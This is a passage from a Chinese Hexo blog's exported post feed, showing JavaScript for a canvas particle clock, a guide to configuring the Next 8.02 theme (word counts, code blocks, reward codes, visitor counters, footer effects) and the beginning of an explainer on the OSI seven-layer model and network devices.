class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0],</span><br><span class="line">            [0,0,1,1,0,0,0]</span><br><span class="line">        ],//7</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,1,1,0]</span><br><span class="line">        ],//8</span><br><span class="line">        [</span><br><span class="line">            [0,1,1,1,1,1,0],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [1,1,0,0,0,1,1],</span><br><span class="line">            [0,1,1,1,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,0,1,1],</span><br><span class="line">            [0,0,0,0,1,1,0],</span><br><span class="line">            [0,0,0,1,1,0,0],</span><br><span class="line">            [0,1,1,0,0,0,0]</span><br><span class="line">        ],//9</span><br><span class="line">        [</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,1,1,1,0,0],</span><br><span class="line">            [0,0,0,0,0,0,0]</span><br><span class="line">        ]//:</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">var canvas = document.getElementById(&#x27;canvas&#x27;);</span><br><span class="line"></span><br><span class="line">if(canvas.getContext)&#123;</span><br><span class="line">    var cxt = canvas.getContext(&#x27;2d&#x27;);</span><br><span class="line">    //声明canvas的宽高</span><br><span class="line">    var H = 100,W = 700;</span><br><span class="line">    canvas.height = H;</span><br><span class="line">    canvas.width = W;</span><br><span class="line">    cxt.fillStyle = &#x27;#f00&#x27;;</span><br><span class="line">    cxt.fillRect(10,10,50,50);</span><br><span class="line"></span><br><span class="line">    //存储时间数据</span><br><span class="line">    var data = [];</span><br><span class="line">    //存储运动的小球</span><br><span class="line">    var balls = [];</span><br><span class="line">    //设置粒子半径</span><br><span class="line">    var R = canvas.height/20-1;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());</span><br><span class="line">        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成</span><br><span class="line">        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);</span><br><span class="line">    &#125;)();</span><br><span class="line"></span><br><span class="line">    /*生成点阵数字*/</span><br><span class="line">    function renderDigit(index,num)&#123;</span><br><span class="line">        for(var i = 0; i &lt; digit[num].length; i++)&#123;</span><br><span class="line">            for(var j = 0; j &lt; digit[num][i].length; j++)&#123;</span><br><span class="line">                if(digit[num][i][j] == 1)&#123;</span><br><span class="line">                    cxt.beginPath();</span><br><span class="line">                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);</span><br><span class="line">                    cxt.closePath();</span><br><span class="line">                    cxt.fill();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*更新时钟*/</span><br><span class="line">    function updateDigitTime()&#123;</span><br><span class="line">        var changeNumArray = [];</span><br><span class="line">        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());</span><br><span class="line">        var NewData = [];</span><br><span class="line">        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);</span><br><span class="line">        for(var i = data.length-1; i &gt;=0 ; i--)&#123;</span><br><span class="line">            //时间发生变化</span><br><span class="line">            if(NewData[i] !== data[i])&#123;</span><br><span class="line">                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中</span><br><span class="line">                changeNumArray.push(i+&#x27;_&#x27;+(Number(data[i])+1)%10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //增加小球</span><br><span class="line">        for(var i = 0; i&lt; changeNumArray.length; i++)&#123;</span><br><span class="line">            addBalls.apply(this,changeNumArray[i].split(&#x27;_&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">        data = NewData.concat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*更新小球状态*/</span><br><span class="line">    function updateBalls()&#123;</span><br><span class="line">        for(var i = 0; i &lt; balls.length; i++)&#123;</span><br><span class="line">            balls[i].stepY += balls[i].disY;</span><br><span class="line">            balls[i].x += balls[i].stepX;</span><br><span class="line">            balls[i].y += balls[i].stepY;</span><br><span class="line">            if(balls[i].x &gt; W + R || balls[i].y &gt; H + R)&#123;</span><br><span class="line">                balls.splice(i,1);</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*增加要运动的小球*/</span><br><span class="line">    function addBalls(index,num)&#123;</span><br><span class="line">        var numArray = [1,2,3];</span><br><span class="line">        var colorArray =  [&quot;#3BE&quot;,&quot;#09C&quot;,&quot;#A6C&quot;,&quot;#93C&quot;,&quot;#9C0&quot;,&quot;#690&quot;,&quot;#FB3&quot;,&quot;#F80&quot;,&quot;#F44&quot;,&quot;#C00&quot;];</span><br><span class="line">        for(var i = 0; i &lt; digit[num].length; i++)&#123;</span><br><span class="line">            for(var j = 0; j &lt; digit[num][i].length; j++)&#123;</span><br><span class="line">                if(digit[num][i][j] == 1)&#123;</span><br><span class="line">                    var ball = &#123;</span><br><span class="line">                        x:14*(R+2)*index + j*2*(R+1)+(R+1),</span><br><span class="line">                        y:i*2*(R+1)+(R+1),</span><br><span class="line">                        stepX:Math.floor(Math.random() * 4 -2),</span><br><span class="line">                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],</span><br><span class="line">                        color:colorArray[Math.floor(Math.random()*colorArray.length)],</span><br><span class="line">                        disY:1</span><br><span class="line">                    &#125;;</span><br><span class="line">                    balls.push(ball);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*渲染*/</span><br><span class="line">    function render()&#123;</span><br><span class="line">        //重置画布宽度，达到清空画布的效果</span><br><span class="line">        canvas.height = 100;</span><br><span class="line">        //渲染时钟</span><br><span class="line">        for(var i = 0; i &lt; data.length; i++)&#123;</span><br><span class="line">            renderDigit(i,data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        //渲染小球</span><br><span class="line">        for(var i = 0; i &lt; balls.length; i++)&#123;</span><br><span class="line">            cxt.beginPath();</span><br><span class="line">            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);</span><br><span class="line">            cxt.fillStyle = balls[i].color;</span><br><span class="line">            cxt.closePath();</span><br><span class="line">            cxt.fill();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clearInterval(oTimer);</span><br><span class="line">    var oTimer = setInterval(function()&#123;</span><br><span class="line">        //更新时钟</span><br><span class="line">        updateDigitTime();</span><br><span class="line">        //更新小球状态</span><br><span class="line">        updateBalls();</span><br><span class="line">        //渲染</span><br><span class="line">        render();</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>然后在主题配置文件中取消 sidebar.njk 的注释。</p>
<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ul>
<li><a href="https://tding.top/" title="小丁的个人博客">小丁的个人博客</a></li>
<li><a href="https://blog.mrzorg.top/" title="zorg&#39;s Blog">zorg’s Blog</a></li>
<li><a href="https://www.hxhowl.com/" title="飞不动的猫">飞不动的猫</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Next</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建与Next8.02主题设置（二）</title>
    <url>/archives/cdd851d9.html</url>
    <content><![CDATA[<p>接着上篇继续</p>
<span id="more"></span>
<h1 id="添加字数统计与阅读时长"><a href="#添加字数统计与阅读时长" class="headerlink" title="添加字数统计与阅读时长"></a>添加字数统计与阅读时长</h1><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>在命令行博客根目录执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>
<h2 id="修改站点配置文件"><a href="#修改站点配置文件" class="headerlink" title="修改站点配置文件"></a>修改站点配置文件</h2><ul>
<li>在站点文件中添加以下内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line"> #文章内是否显示</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line"> # 网页底部是否显示</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br></pre></td></tr></table></figure>

<h2 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h2><ul>
<li>修改主题配置文件中symbols_count_time字段内容：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true  # 是否换行显示 字数统计 及 阅读时长</span><br><span class="line">  item_text_post: true  # 文章 字数统计 阅读时长 使用图标 还是 文本表示</span><br><span class="line">  item_text_total: true # 博客底部统计 字数统计 阅读时长 使用图标 还是 文本表示</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br></pre></td></tr></table></figure>
<h1 id="代码块主题"><a href="#代码块主题" class="headerlink" title="代码块主题"></a>代码块主题</h1><ul>
<li>涵盖一键复制，代码块mac主题，代码块背景颜色。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">codeblock:</span><br><span class="line">  # Code Highlight theme</span><br><span class="line">  # All available themes: https://theme-next.js.org/highlight/</span><br><span class="line">  theme:</span><br><span class="line">    light: tomorrow-night</span><br><span class="line">    dark: tomorrow-light</span><br><span class="line">  prism:</span><br><span class="line">    light: prism</span><br><span class="line">    dark: prism-dark</span><br><span class="line">  # Add copy button on codeblock</span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style: mac</span><br></pre></td></tr></table></figure>
<h1 id="打赏功能"><a href="#打赏功能" class="headerlink" title="打赏功能"></a>打赏功能</h1><p>把需要的收款码放到/themes/next/source/images里面。<br>在主题配置文件搜索reward_settings修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reward_settings:</span><br><span class="line">  # If true, reward will be displayed in every article by default.</span><br><span class="line">  enable: true</span><br><span class="line">  animation: true</span><br><span class="line">  #comment: Donate comment here.</span><br><span class="line"></span><br><span class="line">reward:</span><br><span class="line">  wechatpay: /images/wechatpay.png</span><br><span class="line">  alipay: /images/alipay.png</span><br><span class="line">  #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>
<h1 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h1><p>搜索creative_commons：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creative_commons:</span><br><span class="line">  license: by-nc-sa</span><br><span class="line">  sidebar: false #首页边栏是否显示</span><br><span class="line">  post: true #文章底部是否显示</span><br><span class="line">  language:</span><br></pre></td></tr></table></figure>
<h1 id="标签样式"><a href="#标签样式" class="headerlink" title="标签样式"></a>标签样式</h1><p>默认的标签前面是一个#号，我们把它改成标签的符号。</p>
<p>打开主题配置文件更改tag_icon字段</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- tag_icon: false</span></span><br><span class="line"><span class="addition">+ tag_icon: true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="评论系统"><a href="#评论系统" class="headerlink" title="评论系统"></a>评论系统</h1><p>参考：<a href="https://tding.top/" title="小丁的个人博客">小丁的个人博客</a></p>
<h1 id="添加本站运行时间"><a href="#添加本站运行时间" class="headerlink" title="添加本站运行时间"></a>添加本站运行时间</h1><p>修改/blog/themes/next/layout/_partials/footer.njk文件，在末尾加入如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br /&gt; #换行</span><br><span class="line">&lt;!-- 网站运行时间的设置 --&gt;</span><br><span class="line">&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;</span><br><span class="line">&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date();</span><br><span class="line">    function createtime() &#123;</span><br><span class="line">        var grt= new Date(&quot;04/21/2019 15:54:40&quot;);//此处修改你的建站时间或者网站上线时间</span><br><span class="line">        now.setTime(now.getTime()+250);</span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);</span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);</span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = &quot;0&quot; + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);</span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = &quot;0&quot; + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span><br><span class="line">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = &quot;0&quot; + snum;&#125;</span><br><span class="line">        document.getElementById(&quot;timeDate&quot;).innerHTML = &quot;本站已安全运行 &quot;+dnum+&quot; 天 &quot;;</span><br><span class="line">        document.getElementById(&quot;times&quot;).innerHTML = hnum + &quot; 小时 &quot; + mnum + &quot; 分 &quot; + snum + &quot; 秒&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">setInterval(&quot;createtime()&quot;,250);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1 id="站点访问人数和总访问量"><a href="#站点访问人数和总访问量" class="headerlink" title="站点访问人数和总访问量"></a>站点访问人数和总访问量</h1><p>修改next主题配置文件，搜索busuanzi_count：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true</span><br><span class="line">  total_visitors: true</span><br><span class="line">  total_visitors_icon: user</span><br><span class="line">  total_views: true</span><br><span class="line">  total_views_icon: eye</span><br><span class="line">  post_views: true</span><br><span class="line">  post_views_icon: eye</span><br></pre></td></tr></table></figure>
<h1 id="文章尾部添加本文结束标记"><a href="#文章尾部添加本文结束标记" class="headerlink" title="文章尾部添加本文结束标记"></a>文章尾部添加本文结束标记</h1><p>在博客根目录/source/_data下新建post-body-end.njk文件写入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div class=&quot;end-slogan&quot; style=&quot;text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb&quot;&gt;----------- 本文结束啦&lt;i class=&quot;fa fa-star&quot;&gt;&lt;/i&gt;感谢您阅读-----------&lt;/div&gt;		</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>然后在主题配置文件中取消注释：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="deletion">- #postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line"><span class="addition">+ postBodyEnd: source/_data/post-body-end.njk</span></span><br></pre></td></tr></table></figure>
<h1 id="隐藏底部主题信息"><a href="#隐藏底部主题信息" class="headerlink" title="隐藏底部主题信息"></a>隐藏底部主题信息</h1><p>在主题配置文件中找到powered字段：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- powered: true</span></span><br><span class="line"><span class="addition">+ powered: false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="开启底部爱心动态效果"><a href="#开启底部爱心动态效果" class="headerlink" title="开启底部爱心动态效果"></a>开启底部爱心动态效果</h1><p>在主题配置文件中animated字段：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">- animated: false</span></span><br><span class="line"><span class="addition">+ animated: true</span></span><br></pre></td></tr></table></figure>
<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ul>
<li><a href="https://tding.top/" title="小丁的个人博客">小丁的个人博客</a></li>
<li><a href="https://blog.mrzorg.top/" title="zorg&#39;s Blog">zorg’s Blog</a></li>
<li><a href="https://www.hxhowl.com/" title="飞不动的猫">飞不动的猫</a></li>
</ul>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title>OSI七层模型详解</title>
    <url>/archives/be3a047.html</url>
    <content><![CDATA[<p>OSI 七层模型通过七个层次化的结构模型使不同的系统不同的网络之间实现可靠的通讯，因此其最主要的功能就是帮助不同类型的主机实现数据传输 。<span id="more"></span></p>
<p><img data-src="https://vkali-1303828639.cos.ap-hongkong.myqcloud.com/network/Tcp/tcp.jpg"></p>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>在OSI参考模型中，物理层（Physical Layer）是参考模型的最低层，也是OSI模型的第一层。<br>物理层的主要功能是：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。<br>物理层的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异。使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。</p>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>数据链路层（Data Link Layer）是OSI模型的第二层，负责建立和管理节点间的链路。该层的主要功能是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。<br>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。因此，这一层的主要功能是在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。<br>该层通常又被分为介质访问控制（MAC）和逻辑链路控制（LLC）两个子层。</p>
<p>MAC子层的主要任务是解决共享型网络中多用户对信道竞争的问题，完成网络介质的访问控制；</p>
<p>LLC子层的主要任务是建立和维护网络连接，执行差错校验、流量控制和链路控制。<br>数据链路层的具体工作是接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层；并且，还负责处理接收端发回的确认帧的信息，以便提供可靠的数据传输。</p>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>网络层（Network Layer）是OSI模型的第三层，它是OSI参考模型中最复杂的一层，也是通信子网的最高一层。它在下两层的基础上向资源子网提供服务。其主要任务是：通过路由选择算法，为报文或分组通过通信子网选择最适当的路径。该层控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。具体地说，数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。<br>一般地，数据链路层是解决同一网络内节点之间的通信，而网络层主要解决不同子网间的通信。例如在广域网之间通信时，必然会遇到路由（即两节点间可能有多条路径）选择问题。 </p>
<p>在实现网络层功能时，需要解决的主要问题如下：<br> 寻址：数据链路层中使用的物理地址（如MAC地址）仅解决网络内部的寻址问题。在不同子网之间通信时，为了识别和找到网络中的设备，每一子网中的设备都会被分配一个唯一的地址。由于各子网使用的物理技术可能不同，因此这个地址应当是逻辑地址（如IP地址）。<br> 交换：规定不同的信息交换方式。常见的交换技术有：线路交换技术和存储转发技术，后者又包括报文交换技术和分组交换技术。<br> 路由算法：当源节点和目的节点之间存在多条路径时，本层可以根据路由算法，通过网络为数据分组选择最佳路径，并将信息从最合适的路径由发送端传送到接收端。<br> 连接服务：与数据链路层流量控制不同的是，前者控制的是网络相邻节点间的流量，后者控制的是从源节点到目的节点间的流量。其目的在于防止阻塞，并进行差错检测。</p>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>OSI下3层的主要任务是数据通信，上3层的任务是数据处理。而传输层（Transport Layer）是OSI模型的第4层。因此该层是通信子网和资源子网的接口和桥梁，起到承上启下的作用。<br>该层的主要任务是：向用户提供可靠的端到端的差错和流量控制，保证报文的正确传输。传输层的作用是向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。该层常见的协议：TCP/IP中的TCP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议。<br>传输层提供会话层和网络层之间的传输服务，这种服务从会话层获得数据，并在必要时，对数据进行分割。然后，传输层将数据传递到网络层，并确保数据能正确无误地传送到网络层。因此，传输层负责提供两节点之间数据的可靠传送，当两节点的联系确定之后，传输层则负责监督工作。综上，传输层的主要功能如下：<br>传输连接管理：提供建立、维护和拆除传输连接的功能。传输层在网络层的基础上为高层提供“面向连接”和“面向无接连”的两种服务。<br>处理传输差错：提供可靠的“面向连接”和不太可靠的“面向无连接”的数据传输服务、差错控制和流量控制。在提供“面向连接”服务时，通过这一层传输的数据将由目标设备确认，如果在指定的时间内未收到确认信息，数据将被重发。<br>监控服务质量。</p>
<h2 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h2><p>会话层（Session Layer）是OSI模型的第5层，是用户应用程序和网络之间的接口，主要任务是：向两个实体的表示层提供建立和使用连接的方法。将不同实体之间的表示层的连接称为会话。因此会话层的任务就是组织和协调两个会话进程之间的通信，并对数据交换进行管理。<br>用户可以按照半双工、单工和全双工的方式建立会话。当建立会话时，用户必须提供他们想要连接的远程地址。而这些地址与MAC（介质访问控制子层）地址或网络层的逻辑地址不同，它们是为用户专门设计的，更便于用户记忆。域名（DN）就是一种网络上使用的远程地址例如：<a href="http://www.3721.com就是一个域名。会话层的具体功能如下：">www.3721.com就是一个域名。会话层的具体功能如下：</a><br>会话管理：允许用户在两个实体设备之间建立、维持和终止会话，并支持它们之间的数据交换。例如提供单方向会话或双向同时会话，并管理会话中的发送顺序，以及会话所占用时间的长短。<br> 会话流量控制：提供会话流量控制和交叉会话功能。<br>寻址：使用远程地址建立会话连接。l<br>出错控制：从逻辑上讲会话层主要负责数据交换的建立、保持和终止，但实际的工作却是接收来自传输层的数据，并负责纠正错误。会话控制和远程过程调用均属于这一层的功能。但应注意，此层检查的错误不是通信介质的错误，而是磁盘空间、打印机缺纸等类型的高级错误。</p>
<h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><p>表示层（Presentation Layer）是OSI模型的第六层，它对来自应用层的命令和数据进行解释，对各种语法赋予相应的含义，并按照一定的格式传送给会话层。其主要功能是“处理用户信息的表示问题，如编码、数据格式转换和加密解密”等。表示层的具体功能如下：<br>数据格式处理：协商和建立数据交换的格式，解决各应用程序之间在数据格式表示上的差异。<br>数据的编码：处理字符集和数字的转换。例如由于用户程序中的数据类型（整型或实型、有符号或无符号等）、用户标识等都可以有不同的表示方式，因此，在设备之间需要具有在不同字符集或格式之间转换的功能。<br>压缩和解压缩：为了减少数据的传输量，这一层还负责数据的压缩与恢复。<br>数据的加密和解密：可以提高网络的安全性。</p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层（Application Layer）是OSI参考模型的最高层，它是计算机用户，以及各种应用程序和网络之间的接口，其功能是直接向用户提供服务，完成用户希望在网络上完成的各种工作。它在其他6层工作的基础上，负责完成网络中应用程序与网络操作系统之间的联系，建立与结束使用者之间的联系，并完成网络用户提出的各种网络服务及应用所需的监督、管理和服务等各种协议。此外，该层还负责协调各个应用程序间的工作。<br>应用层为用户提供的服务和协议有：文件服务、目录服务、文件传输服务（FTP）、远程登录服务（Telnet）、电子邮件服务（E-mail）、打印服务、安全服务、网络管理服务、数据库服务等。上述的各种网络服务由该层的不同应用协议和程序完成，不同的网络操作系统之间在功能、界面、实现技术、对硬件的支持、安全可靠性以及具有的各种应用程序接口等各个方面的差异是很大的。应用层的主要功能如下：<br>用户接口：应用层是用户与网络，以及应用程序与网络间的直接接口，使得用户能够与网络进行交互式联系。<br>实现各种服务：该层具有的各种应用程序可以完成和实现用户请求的各种服务。</p>
<h2 id="设备举例"><a href="#设备举例" class="headerlink" title="设备举例"></a>设备举例</h2><p>一个设备工作在哪一层，关键看它工作时利用哪一层的数据头部信息。网桥工作时，是以MAC头部来决定转发端口的，因此显然它是数据链路层的设备。<br>具体说:</p>
<ul>
<li><p>物理层：网卡，网线，集线器，中继器，调制解调器</p>
</li>
<li><p>数据链路层：网桥，交换机</p>
</li>
<li><p>网络层：路由器</p>
</li>
</ul>
<p>网关工作在第四层传输层及其以上</p>
<p>集线器是物理层设备,采用广播的形式来传输信息。</p>
<p>交换机就是用来进行报文交换的机器。多为链路层设备(二层交换机)，能够进行地址学习，采用存储转发的形式来交换报文.。</p>
<p>路由器的一个作用是连通不同的网络，另一个作用是选择信息传送的线路。选择通畅快捷的近路，能大大提高通信速度，减轻网络系统通信负荷，节约网络系统资源，提高网络系统畅通率。</p>
<h2 id="交换机和路由器的区别"><a href="#交换机和路由器的区别" class="headerlink" title="交换机和路由器的区别"></a>交换机和路由器的区别</h2><p>交换机拥有一条很高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条总线上，控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的MAC（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部交换矩阵迅速将数据包传送到目的端口，目的MAC若不存在则广播到所有的端口，接收端口回应后交换机会“学习”新的地址，并把它添加入内部MAC地址表中。<br>使用交换机也可以把网络“分段”，通过对照MAC地址表，交换机只允许必要的网络流量通过交换机。通过交换机的过滤和转发，可以有效的隔离广播风暴，减少误包和错包的出现，避免共享冲突。<br>交换机在同一时刻可进行多个端口对之间的数据传输。每一端口都可视为独立的网段，连接在其上的网络设备独自享有全部的带宽，无须同其他设备竞争使用。当节点A向节点D发送数据时，节点B可同时向节点C发送数据，而且这两个传输都享有网络的全部带宽，都有着自己的虚拟连接。假使这里使用的是10Mbps的以太网交换机，那么该交换机这时的总流通量就等于2×10Mbps＝20Mbps，而使用10Mbps的共享式HUB时，一个HUB的总流通量也不会超出10Mbps。<br>总之，交换机是一种基于MAC地址识别，能完成封装转发数据包功能的网络设备。交换机可以“学习”MAC地址，并把其存放在内部地址表中，通过在数据帧的始发者和目标接收者之间建立临时的交换路径，使数据帧直接由源地址到达目的地址。</p>
<p>从过滤网络流量的角度来看，路由器的作用与交换机和网桥非常相似。但是与工作在网络物理层，从物理上划分网段的交换机不同，路由器使用专门的软件协议从逻辑上对整个网络进行划分。例如，一台支持IP协议的路由器可以把网络划分成多个子网段，只有指向特殊IP地址的网络流量才可以通过路由器。对于每一个接收到的数据包，路由器都会重新计算其校验值，并写入新的物理地址。因此，使用路由器转发和过滤数据的速度往往要比只查看数据包物理地址的交换机慢。但是，对于那些结构复杂的网络，使用路由器可以提高网络的整体效率。路由器的另外一个明显优势就是可以自动过滤网络广播。</p>
<h2 id="集线器与路由器在功能上的区别"><a href="#集线器与路由器在功能上的区别" class="headerlink" title="集线器与路由器在功能上的区别"></a>集线器与路由器在功能上的区别</h2><p>首先说HUB,也就是集线器。它的作用可以简单的理解为将一些机器连接起来组成一个局域网。而交换机（又名交换式集线器）作用与集线器大体相同。但是两者在性能上有区别：集线器采用的式共享带宽的工作方式，而交换机是独享带宽。这样在机器很多或数据量很大时，两者将会有比较明显的。而路由器与以上两者有明显区别，它的作用在于连接不同的网段并且找到网络中数据传输最合适的路径。路由器是产生于交换机之后，就像交换机产生于集线器之后，所以路由器与交换机也有一定联系，不是完全独立的两种设备。路由器主要克服了交换机不能路由转发数据包的不足。 </p>
<p>总的来说，路由器与交换机的主要区别体现在以下几个方面： </p>
<p>（1）工作层次不同<br>最初的的交换机是工作在数据链路层，而路由器一开始就设计工作在网络层。由于交换机工作在数据链路层，所以它的工作原理比较简单，而路由器工作在网络层，可以得到更多的协议信息，路由器可以做出更加智能的转发决策。 </p>
